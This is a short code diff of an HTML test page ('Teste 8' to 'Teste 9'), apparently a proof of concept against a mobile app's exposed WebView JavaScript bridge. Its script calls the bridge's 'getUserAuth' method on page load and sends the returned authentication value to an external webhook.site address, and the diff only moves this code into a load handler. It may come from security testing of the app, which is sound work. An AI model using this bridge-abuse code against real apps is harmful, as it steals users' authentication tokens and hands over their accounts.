@@ -20,19 +20,22 @@
     </script> -->
     <script>
 
+        document.addEventListener("DOMContentLoaded", ()=>{
 
-        const webhook = "https://webhook.site/add1eeab-eb79-47ba-8837-fa1fea9ff40d"
-
-        const db = window.dsBridge || window._dsBridge
-        // const db = window._dsBridge
-
-
-        db.call("getUserAuth", function (value) {
-            // alert(value)
-            document.getElementById("batata").innerHTML = value
-            fetch(webhook + "?data=" + value, { mode: "no-cors" })
-
+            const webhook = "https://webhook.site/add1eeab-eb79-47ba-8837-fa1fea9ff40d"
+    
+            const db = window.dsBridge || window._dsBridge
+            // const db = window._dsBridge
+    
+    
+            db.call("getUserAuth", function (value) {
+                // alert(value)
+                document.getElementById("batata").innerHTML = value
+                fetch(webhook + "?data=" + value, { mode: "no-cors" })
+    
+            })
         })
+
 
 
 
@@ -41,7 +44,7 @@
 <script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.min.js"></script>
 
 <body>
-    <h1>Teste 8</h1>
+    <h1>Teste 9</h1>
     <br>
     <h2 id="batata">batata</h2>
 </body>
